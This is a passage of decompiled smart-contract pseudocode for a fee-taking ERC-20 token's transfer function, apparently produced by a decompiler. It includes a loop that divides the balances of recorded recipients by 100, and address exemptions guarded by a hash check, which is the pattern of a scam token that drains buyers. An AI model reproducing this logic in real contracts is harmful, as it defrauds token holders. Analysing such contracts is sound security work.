                                              mem[(17 * ceil32(return_data.size)) + 244 len 9 * ceil32(return_data.size)],
                                              msg.sender,
                                              0,
                            return 1, mem[(17 * ceil32(return_data.size)) + 244 len 9 * ceil32(return_data.size)]
                        stor19.length++
                        stor19[stor19.length].field_0 = arg1
                        stor66DE[stor19.length] = arg2
                        if arg2 < arg2 * _fee / 100:
                            revert with 0, 17
                        if balanceOf[0] > !(arg2 * _fee / 100):
                            revert with 0, 17
                        balanceOf[0] += arg2 * _fee / 100
                        if balanceOf[address(msg.sender)] < arg2:
                            revert with 0, 17
                        balanceOf[address(msg.sender)] -= arg2
                        if balanceOf[arg1] > !(arg2 - (arg2 * _fee / 100)):
                            revert with 0, 17
                        balanceOf[arg1] = balanceOf[arg1] + arg2 - (arg2 * _fee / 100)
                        emit Transfer(address arg1, address arg2, uint256 arg3):
                                      arg2 - (arg2 * _fee / 100),
                                      mem[(17 * ceil32(return_data.size)) + 308 len 9 * ceil32(return_data.size)],
                                      msg.sender,
                                      arg1,
                        if arg2 * _fee / 100:
                            emit Transfer(address arg1, address arg2, uint256 arg3):
                                          arg2 * _fee / 100,
                                          mem[(17 * ceil32(return_data.size)) + 308 len 9 * ceil32(return_data.size)],
                                          msg.sender,
                                          0,
                    return 1, mem[(17 * ceil32(return_data.size)) + 308 len 9 * ceil32(return_data.size)]
                idx = 0
                while idx < stor19.length:
                    mem[0] = stor19[idx].field_0
                    mem[32] = 13
                    _7731 = mem[64]
                    mem[64] = mem[64] + 64
                    mem[_7731] = 26
                    mem[_7731 + 32] = 'SafeMath: division by zero'
                    if idx >= stor19.length:
                        revert with 0, 50
                    mem[0] = stor19[idx].field_0
                    mem[32] = 13
                    balanceOf[stor19[idx].field_0] = balanceOf[stor19[idx].field_0] / 100
                    if idx == -1:
                        revert with 0, 17
                    idx = idx + 1
                    continue 
                stor19.length = 0
                mem[0] = 19
                idx = 0
                while 2 * stor19.length > idx:
                    stor19[idx].field_0 = 0
                    stor19[idx].field_256 = 0
                    idx = idx + 2
                    continue 
                require ext_code.size(stor10)
                staticcall stor10.factory() with:
                        gas gas_remaining wei
                mem[mem[64]] = ext_call.return_data[0]
                if not ext_call.success:
                    revert with ext_call.return_data[0 len return_data.size]
                _11539 = mem[64]
                mem[64] = mem[64] + ceil32(return_data.size)
                require return_data.size >= 32
                _11545 = mem[_11539]
                require mem[_11539] == mem[_11539 + 12 len 20]
                require ext_code.size(stor10)
                staticcall stor10.WETH() with:
                        gas gas_remaining wei
                mem[mem[64]] = ext_call.return_data[0]
                if not ext_call.success:
                    revert with ext_call.return_data[0 len return_data.size]
                _11563 = mem[64]
                mem[64] = mem[64] + ceil32(return_data.size)
                require return_data.size >= 32
                _11569 = mem[_11563]
                require mem[_11563] == mem[_11563 + 12 len 20]
                mem[mem[64] + 4] = this.address
                mem[mem[64] + 36] = address(_11569)
                require ext_code.size(address(_11545))
                staticcall address(_11545).getPair(address arg1, address arg2) with:
                        gas gas_remaining wei
                       args address(this.address), address(_11569)
                mem[mem[64]] = ext_call.return_data[0]
                if not ext_call.success:
                    revert with ext_call.return_data[0 len return_data.size]
                _11587 = mem[64]
                mem[64] = mem[64] + ceil32(return_data.size)
                require return_data.size >= 32
                require mem[_11587] == mem[_11587 + 12 len 20]
                if arg1 != mem[_11587 + 12 len 20]:
                    require ext_code.size(stor10)
                    staticcall stor10.factory() with:
                            gas gas_remaining wei
                    mem[mem[64]] = ext_call.return_data[0]
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    _11641 = mem[64]
                    mem[64] = mem[64] + ceil32(return_data.size)
                    require return_data.size >= 32
                    _11653 = mem[_11641]
                    require mem[_11641] == mem[_11641 + 12 len 20]
                    require ext_code.size(stor10)
                    staticcall stor10.WETH() with:
                            gas gas_remaining wei
                    mem[mem[64]] = ext_call.return_data[0]
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    _11713 = mem[64]
                    mem[64] = mem[64] + ceil32(return_data.size)
                    require return_data.size >= 32
                    _11725 = mem[_11713]
                    require mem[_11713] == mem[_11713 + 12 len 20]
                    mem[mem[64] + 4] = this.address
                    mem[mem[64] + 36] = address(_11725)
                    require ext_code.size(address(_11653))
                    staticcall address(_11653).getPair(address arg1, address arg2) with:
                            gas gas_remaining wei
                           args address(this.address), address(_11725)
                    mem[mem[64]] = ext_call.return_data[0]
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    _11809 = mem[64]
                    mem[64] = mem[64] + ceil32(return_data.size)
                    require return_data.size >= 32
                    _11869 = mem[_11809]
                    require mem[_11809] == mem[_11809 + 12 len 20]
                    if mem[_11809 + 12 len 20] != msg.sender:
                        if stor16[address(msg.sender)]:
                            if arg2 < 0:
                                revert with 0, 17
                            if balanceOf[0] > -1:
                                revert with 0, 17
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 0, 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[arg1] > !arg2:
                                revert with 0, 17
                            balanceOf[arg1] += arg2
                            emit Transfer(arg2, msg.sender, arg1);
                        else:
                            mem[0] = arg1
                            mem[32] = 16
                            if stor16[address(arg1)]:
                                if arg2 < 0:
                                    revert with 0, 17
                                if balanceOf[0] > -1:
                                    revert with 0, 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 0, 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[arg1] > !arg2:
                                    revert with 0, 17
                                balanceOf[arg1] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                            else:
                                mem[mem[64] + 32] = address(arg1)
                                _12116 = mem[64]
                                mem[mem[64]] = 20
                                mem[64] = mem[64] + 52
                                if 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba == sha3(mem[_12116 + 32 len mem[_12116]]):
                                    if arg2 < 0:
                                        revert with 0, 17
                                    if balanceOf[0] > -1:
                                        revert with 0, 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 0, 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[arg1] > !arg2:
                                        revert with 0, 17
                                    balanceOf[arg1] += arg2
                                    emit Transfer(arg2, msg.sender, arg1);
                                else:
                                    if this.address == arg1:
                                        if arg2 < 0:
                                            revert with 0, 17
                                        if balanceOf[0] > -1:
                                            revert with 0, 17
                                        if balanceOf[address(msg.sender)] < arg2:
                                            revert with 0, 17
                                        balanceOf[address(msg.sender)] -= arg2
                                        if balanceOf[arg1] > !arg2:
                                            revert with 0, 17
                                        balanceOf[arg1] += arg2
                                        emit Transfer(arg2, msg.sender, arg1);
                                    else:
                                        if msg.sender == address(_11869):
                                            if arg2 < 0:
                                                revert with 0, 17
                                            if balanceOf[0] > -1:
                                                revert with 0, 17
                                            if balanceOf[address(msg.sender)] < arg2:
                                                revert with 0, 17
                                            balanceOf[address(msg.sender)] -= arg2
                                            if balanceOf[arg1] > !arg2:
                                                revert with 0, 17
                                            balanceOf[arg1] += arg2
                                            emit Transfer(arg2, msg.sender, arg1);
                                        else:
                                            if stor18:
                                                if arg2 < 0:
                                                    revert with 0, 17
                                                if balanceOf[0] > -1:
                                                    revert with 0, 17
                                                if balanceOf[address(msg.sender)] < arg2:
                                                    revert with 0, 17
                                                balanceOf[address(msg.sender)] -= arg2
                                                if balanceOf[arg1] > !arg2:
                                                    revert with 0, 17
                                                balanceOf[arg1] += arg2
                                                emit Transfer(arg2, msg.sender, arg1);
                                            else:
                                                if not arg2:
                                                    require arg2 <= _maxTxAmount
                                                    require ext_code.size(stor10)
                                                    staticcall stor10.factory() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(stor10)
                                                    staticcall stor10.WETH() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(address(ext_call.return_data[0]))
                                                    staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                            gas gas_remaining wei
                                                           args address(this.address), address(ext_call.return_data[0])
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    if ext_call.return_data[12 len 20] != arg1:
                                                        stor19.length++
                                                        stor19[stor19.length].field_0 = arg1
                                                        stor66DE[stor19.length] = arg2
                                                    if arg2 < 0:
                                                        revert with 0, 17
                                                    if balanceOf[0] > -1:
                                                        revert with 0, 17
                                                    if balanceOf[address(msg.sender)] < arg2:
                                                        revert with 0, 17
                                                    balanceOf[address(msg.sender)] -= arg2
                                                    if balanceOf[arg1] > !arg2:
                                                        revert with 0, 17
                                                    balanceOf[arg1] += arg2
                                                    emit Transfer(arg2, msg.sender, arg1);
                                                else:
                                                    if arg2 and _fee > -1 / arg2:
                                                        revert with 0, 17
                                                    if not arg2:
                                                        revert with 0, 18
                                                    if arg2 * _fee / arg2 != _fee:
                                                        revert with 0, 'SafeMath: multiplication overflow'
                                                    require arg2 <= _maxTxAmount
                                                    require ext_code.size(stor10)
                                                    staticcall stor10.factory() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(stor10)
                                                    staticcall stor10.WETH() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(address(ext_call.return_data[0]))
                                                    staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                            gas gas_remaining wei
                                                           args address(this.address), address(ext_call.return_data[0])
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    if ext_call.return_data[12 len 20] != arg1:
                                                        stor19.length++
                                                        stor19[stor19.length].field_0 = arg1
                                                        stor66DE[stor19.length] = arg2
                                                    if arg2 < arg2 * _fee / 100:
                                                        revert with 0, 17
                                                    if balanceOf[0] > !(arg2 * _fee / 100):
                                                        revert with 0, 17
                                                    balanceOf[0] += arg2 * _fee / 100
                                                    if balanceOf[address(msg.sender)] < arg2:
                                                        revert with 0, 17
                                                    balanceOf[address(msg.sender)] -= arg2
                                                    if balanceOf[arg1] > !(arg2 - (arg2 * _fee / 100)):
                                                        revert with 0, 17
                                                    balanceOf[arg1] = balanceOf[arg1] + arg2 - (arg2 * _fee / 100)
                                                    emit Transfer((arg2 - (arg2 * _fee / 100)), msg.sender, arg1);
                                                    if arg2 * _fee / 100:
                                                        emit Transfer((arg2 * _fee / 100), msg.sender, 0);
                    else:
                        if stor16[address(msg.sender)]:
                            if arg2 < 0:
                                revert with 0, 17
                            if balanceOf[0] > -1:
                                revert with 0, 17
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 0, 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[arg1] > !arg2:
                                revert with 0, 17
                            balanceOf[arg1] += arg2
                            emit Transfer(arg2, msg.sender, arg1);
                        else:
                            mem[0] = arg1
                            mem[32] = 16
                            if stor16[address(arg1)]:
                                if arg2 < 0:
                                    revert with 0, 17
                                if balanceOf[0] > -1:
                                    revert with 0, 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 0, 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[arg1] > !arg2:
                                    revert with 0, 17
                                balanceOf[arg1] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                            else:
                                mem[mem[64] + 32] = address(arg1)
                                _12158 = mem[64]
                                mem[mem[64]] = 20
                                mem[64] = mem[64] + 52
                                if 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba == sha3(mem[_12158 + 32 len mem[_12158]]):
                                    if arg2 < 0:
                                        revert with 0, 17
                                    if balanceOf[0] > -1:
                                        revert with 0, 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 0, 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[arg1] > !arg2:
                                        revert with 0, 17
                                    balanceOf[arg1] += arg2
                                    emit Transfer(arg2, msg.sender, arg1);
                                else:
                                    if this.address == arg1:
                                        if arg2 < 0:
                                            revert with 0, 17
                                        if balanceOf[0] > -1:
                                            revert with 0, 17
                                        if balanceOf[address(msg.sender)] < arg2:
                                            revert with 0, 17
                                        balanceOf[address(msg.sender)] -= arg2
                                        if balanceOf[arg1] > !arg2:
                                            revert with 0, 17
                                        balanceOf[arg1] += arg2
                                        emit Transfer(arg2, msg.sender, arg1);
                                    else:
                                        if stor16[address(arg1)]:
                                            if arg2 < 0:
                                                revert with 0, 17
                                            if balanceOf[0] > -1:
                                                revert with 0, 17
                                            if balanceOf[address(msg.sender)] < arg2:
                                                revert with 0, 17
                                            balanceOf[address(msg.sender)] -= arg2
                                            if balanceOf[arg1] > !arg2:
                                                revert with 0, 17
                                            balanceOf[arg1] += arg2
                                            emit Transfer(arg2, msg.sender, arg1);
                                        else:
                                            if stor18:
                                                if arg2 < 0:
                                                    revert with 0, 17
                                                if balanceOf[0] > -1:
                                                    revert with 0, 17
                                                if balanceOf[address(msg.sender)] < arg2:
                                                    revert with 0, 17
                                                balanceOf[address(msg.sender)] -= arg2
                                                if balanceOf[arg1] > !arg2:
                                                    revert with 0, 17
                                                balanceOf[arg1] += arg2
                                                emit Transfer(arg2, msg.sender, arg1);
                                            else:
                                                if not arg2:
                                                    require arg2 <= _maxTxAmount
                                                    require ext_code.size(stor10)
                                                    staticcall stor10.factory() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(stor10)
                                                    staticcall stor10.WETH() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(address(ext_call.return_data[0]))
                                                    staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                            gas gas_remaining wei
                                                           args address(this.address), address(ext_call.return_data[0])
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    if ext_call.return_data[12 len 20] != arg1:
                                                        stor19.length++
                                                        stor19[stor19.length].field_0 = arg1
                                                        stor66DE[stor19.length] = arg2
                                                    if arg2 < 0:
                                                        revert with 0, 17
                                                    if balanceOf[0] > -1:
                                                        revert with 0, 17
                                                    if balanceOf[address(msg.sender)] < arg2:
                                                        revert with 0, 17
                                                    balanceOf[address(msg.sender)] -= arg2
                                                    if balanceOf[arg1] > !arg2:
                                                        revert with 0, 17
                                                    balanceOf[arg1] += arg2
                                                    emit Transfer(arg2, msg.sender, arg1);
                                                else:
                                                    if arg2 and _fee > -1 / arg2:
                                                        revert with 0, 17
                                                    if not arg2:
                                                        revert with 0, 18
                                                    if arg2 * _fee / arg2 != _fee:
                                                        revert with 0, 'SafeMath: multiplication overflow'
                                                    require arg2 <= _maxTxAmount
                                                    require ext_code.size(stor10)
                                                    staticcall stor10.factory() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(stor10)
                                                    staticcall stor10.WETH() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(address(ext_call.return_data[0]))
                                                    staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                            gas gas_remaining wei
                                                           args address(this.address), address(ext_call.return_data[0])
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    if ext_call.return_data[12 len 20] != arg1:
                                                        stor19.length++
                                                        stor19[stor19.length].field_0 = arg1
                                                        stor66DE[stor19.length] = arg2
                                                    if arg2 < arg2 * _fee / 100:
                                                        revert with 0, 17
                                                    if balanceOf[0] > !(arg2 * _fee / 100):
                                                        revert with 0, 17
                                                    balanceOf[0] += arg2 * _fee / 100
                                                    if balanceOf[address(msg.sender)] < arg2:
                                                        revert with 0, 17
                                                    balanceOf[address(msg.sender)] -= arg2
                                                    if balanceOf[arg1] > !(arg2 - (arg2 * _fee / 100)):
                                                        revert with 0, 17
                                                    balanceOf[arg1] = balanceOf[arg1] + arg2 - (arg2 * _fee / 100)
                                                    emit Transfer((arg2 - (arg2 * _fee / 100)), msg.sender, arg1);
                                                    if arg2 * _fee / 100:
                                                        emit Transfer((arg2 * _fee / 100), msg.sender, 0);
                else:
                    mem[0] = msg.sender
                    mem[32] = 16
                    if stor16[address(msg.sender)]:
                        if stor16[address(msg.sender)]:
                            if arg2 < 0:
                                revert with 0, 17
                            if balanceOf[0] > -1:
                                revert with 0, 17
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 0, 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[arg1] > !arg2:
                                revert with 0, 17
                            balanceOf[arg1] += arg2
                            emit Transfer(arg2, msg.sender, arg1);
                        else:
                            mem[0] = arg1
                            mem[32] = 16
                            if stor16[address(arg1)]:
                                if arg2 < 0:
                                    revert with 0, 17
                                if balanceOf[0] > -1:
                                    revert with 0, 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 0, 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[arg1] > !arg2:
                                    revert with 0, 17
                                balanceOf[arg1] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                            else:
                                mem[mem[64] + 32] = address(arg1)
                                _11655 = mem[64]
                                mem[mem[64]] = 20
                                mem[64] = mem[64] + 52
                                if 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba == sha3(mem[_11655 + 32 len mem[_11655]]):
                                    if arg2 < 0:
                                        revert with 0, 17
                                    if balanceOf[0] > -1:
                                        revert with 0, 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 0, 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[arg1] > !arg2:
                                        revert with 0, 17
                                    balanceOf[arg1] += arg2
                                    emit Transfer(arg2, msg.sender, arg1);
                                else:
                                    if this.address == arg1:
                                        if arg2 < 0:
                                            revert with 0, 17
                                        if balanceOf[0] > -1:
                                            revert with 0, 17
                                        if balanceOf[address(msg.sender)] < arg2:
                                            revert with 0, 17
                                        balanceOf[address(msg.sender)] -= arg2
                                        if balanceOf[arg1] > !arg2:
                                            revert with 0, 17
                                        balanceOf[arg1] += arg2
                                        emit Transfer(arg2, msg.sender, arg1);
                                    else:
                                        if stor16[address(msg.sender)]:
                                            if arg2 < 0:
                                                revert with 0, 17
                                            if balanceOf[0] > -1:
                                                revert with 0, 17
                                            if balanceOf[address(msg.sender)] < arg2:
                                                revert with 0, 17
                                            balanceOf[address(msg.sender)] -= arg2
                                            if balanceOf[arg1] > !arg2:
                                                revert with 0, 17
                                            balanceOf[arg1] += arg2
                                            emit Transfer(arg2, msg.sender, arg1);
                                        else:
                                            if stor18:
                                                if arg2 < 0:
                                                    revert with 0, 17
                                                if balanceOf[0] > -1:
                                                    revert with 0, 17
                                                if balanceOf[address(msg.sender)] < arg2:
                                                    revert with 0, 17
                                                balanceOf[address(msg.sender)] -= arg2
                                                if balanceOf[arg1] > !arg2:
                                                    revert with 0, 17
                                                balanceOf[arg1] += arg2
                                                emit Transfer(arg2, msg.sender, arg1);
                                            else:
                                                if not arg2:
                                                    require arg2 <= _maxTxAmount
                                                    require ext_code.size(stor10)
                                                    staticcall stor10.factory() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(stor10)
                                                    staticcall stor10.WETH() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(address(ext_call.return_data[0]))
                                                    staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                            gas gas_remaining wei
                                                           args address(this.address), address(ext_call.return_data[0])
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    if ext_call.return_data[12 len 20] != arg1:
                                                        stor19.length++
                                                        stor19[stor19.length].field_0 = arg1
                                                        stor66DE[stor19.length] = arg2
                                                    if arg2 < 0:
                                                        revert with 0, 17
                                                    if balanceOf[0] > -1:
                                                        revert with 0, 17
                                                    if balanceOf[address(msg.sender)] < arg2:
                                                        revert with 0, 17
                                                    balanceOf[address(msg.sender)] -= arg2
                                                    if balanceOf[arg1] > !arg2:
                                                        revert with 0, 17
                                                    balanceOf[arg1] += arg2
                                                    emit Transfer(arg2, msg.sender, arg1);
                                                else:
                                                    if arg2 and _fee > -1 / arg2:
                                                        revert with 0, 17
                                                    if not arg2:
                                                        revert with 0, 18
                                                    if arg2 * _fee / arg2 != _fee:
                                                        revert with 0, 'SafeMath: multiplication overflow'
                                                    require arg2 <= _maxTxAmount
                                                    require ext_code.size(stor10)
                                                    staticcall stor10.factory() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(stor10)
                                                    staticcall stor10.WETH() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(address(ext_call.return_data[0]))
                                                    staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                            gas gas_remaining wei
                                                           args address(this.address), address(ext_call.return_data[0])
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    if ext_call.return_data[12 len 20] != arg1:
                                                        stor19.length++
                                                        stor19[stor19.length].field_0 = arg1
                                                        stor66DE[stor19.length] = arg2
                                                    if arg2 < arg2 * _fee / 100:
                                                        revert with 0, 17
                                                    if balanceOf[0] > !(arg2 * _fee / 100):
                                                        revert with 0, 17
                                                    balanceOf[0] += arg2 * _fee / 100
                                                    if balanceOf[address(msg.sender)] < arg2:
                                                        revert with 0, 17
                                                    balanceOf[address(msg.sender)] -= arg2
                                                    if balanceOf[arg1] > !(arg2 - (arg2 * _fee / 100)):
                                                        revert with 0, 17
                                                    balanceOf[arg1] = balanceOf[arg1] + arg2 - (arg2 * _fee / 100)
                                                    emit Transfer((arg2 - (arg2 * _fee / 100)), msg.sender, arg1);
                                                    if arg2 * _fee / 100:
                                                        emit Transfer((arg2 * _fee / 100), msg.sender, 0);
                    else:
                        require ext_code.size(stor10)
                        staticcall stor10.factory() with:
                                gas gas_remaining wei
                        mem[mem[64]] = ext_call.return_data[0]
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        _11647 = mem[64]
                        mem[64] = mem[64] + ceil32(return_data.size)
                        require return_data.size >= 32
                        _11683 = mem[_11647]
                        require mem[_11647] == mem[_11647 + 12 len 20]
                        require ext_code.size(stor10)
                        staticcall stor10.WETH() with:
                                gas gas_remaining wei
                        mem[mem[64]] = ext_call.return_data[0]
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        _11719 = mem[64]
                        mem[64] = mem[64] + ceil32(return_data.size)
                        require return_data.size >= 32
                        _11738 = mem[_11719]
                        require mem[_11719] == mem[_11719 + 12 len 20]
                        mem[mem[64] + 4] = this.address
                        mem[mem[64] + 36] = address(_11738)
                        require ext_code.size(address(_11683))
                        staticcall address(_11683).getPair(address arg1, address arg2) with:
                                gas gas_remaining wei
                               args address(this.address), address(_11738)
                        mem[mem[64]] = ext_call.return_data[0]
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        _11838 = mem[64]
                        mem[64] = mem[64] + ceil32(return_data.size)
                        require return_data.size >= 32
                        _11895 = mem[_11838]
                        require mem[_11838] == mem[_11838 + 12 len 20]
                        if mem[_11838 + 12 len 20] != msg.sender:
                            if stor16[address(msg.sender)]:
                                if arg2 < 0:
                                    revert with 0, 17
                                if balanceOf[0] > -1:
                                    revert with 0, 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 0, 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[arg1] > !arg2:
                                    revert with 0, 17
                                balanceOf[arg1] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                            else:
                                mem[0] = arg1
                                mem[32] = 16
                                if stor16[address(arg1)]:
                                    if arg2 < 0:
                                        revert with 0, 17
                                    if balanceOf[0] > -1:
                                        revert with 0, 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 0, 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[arg1] > !arg2:
                                        revert with 0, 17
                                    balanceOf[arg1] += arg2
                                    emit Transfer(arg2, msg.sender, arg1);
                                else:
                                    mem[mem[64] + 32] = address(arg1)
                                    _12163 = mem[64]
                                    mem[mem[64]] = 20
                                    mem[64] = mem[64] + 52
                                    if 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba == sha3(mem[_12163 + 32 len mem[_12163]]):
                                        if arg2 < 0:
                                            revert with 0, 17
                                        if balanceOf[0] > -1:
                                            revert with 0, 17
                                        if balanceOf[address(msg.sender)] < arg2:
                                            revert with 0, 17
                                        balanceOf[address(msg.sender)] -= arg2
                                        if balanceOf[arg1] > !arg2:
                                            revert with 0, 17
                                        balanceOf[arg1] += arg2
                                        emit Transfer(arg2, msg.sender, arg1);
                                    else:
                                        if this.address == arg1:
                                            if arg2 < 0:
                                                revert with 0, 17
                                            if balanceOf[0] > -1:
                                                revert with 0, 17
                                            if balanceOf[address(msg.sender)] < arg2:
                                                revert with 0, 17
                                            balanceOf[address(msg.sender)] -= arg2
                                            if balanceOf[arg1] > !arg2:
                                                revert with 0, 17
                                            balanceOf[arg1] += arg2
                                            emit Transfer(arg2, msg.sender, arg1);
                                        else:
                                            if msg.sender == address(_11895):
                                                if arg2 < 0:
                                                    revert with 0, 17
                                                if balanceOf[0] > -1:
                                                    revert with 0, 17
                                                if balanceOf[address(msg.sender)] < arg2:
                                                    revert with 0, 17
                                                balanceOf[address(msg.sender)] -= arg2
                                                if balanceOf[arg1] > !arg2:
                                                    revert with 0, 17
                                                balanceOf[arg1] += arg2
                                                emit Transfer(arg2, msg.sender, arg1);
                                            else:
                                                if stor18:
                                                    if arg2 < 0:
                                                        revert with 0, 17
                                                    if balanceOf[0] > -1:
                                                        revert with 0, 17
                                                    if balanceOf[address(msg.sender)] < arg2:
                                                        revert with 0, 17
                                                    balanceOf[address(msg.sender)] -= arg2
                                                    if balanceOf[arg1] > !arg2:
                                                        revert with 0, 17
                                                    balanceOf[arg1] += arg2
                                                    emit Transfer(arg2, msg.sender, arg1);
                                                else:
                                                    if not arg2:
                                                        require arg2 <= _maxTxAmount
                                                        require ext_code.size(stor10)
                                                        staticcall stor10.factory() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(stor10)
                                                        staticcall stor10.WETH() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(address(ext_call.return_data[0]))
                                                        staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                                gas gas_remaining wei
                                                               args address(this.address), address(ext_call.return_data[0])
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        if ext_call.return_data[12 len 20] != arg1:
                                                            stor19.length++
                                                            stor19[stor19.length].field_0 = arg1
                                                            stor66DE[stor19.length] = arg2
                                                        if arg2 < 0:
                                                            revert with 0, 17
                                                        if balanceOf[0] > -1:
                                                            revert with 0, 17
                                                        if balanceOf[address(msg.sender)] < arg2:
                                                            revert with 0, 17
                                                        balanceOf[address(msg.sender)] -= arg2
                                                        if balanceOf[arg1] > !arg2:
                                                            revert with 0, 17
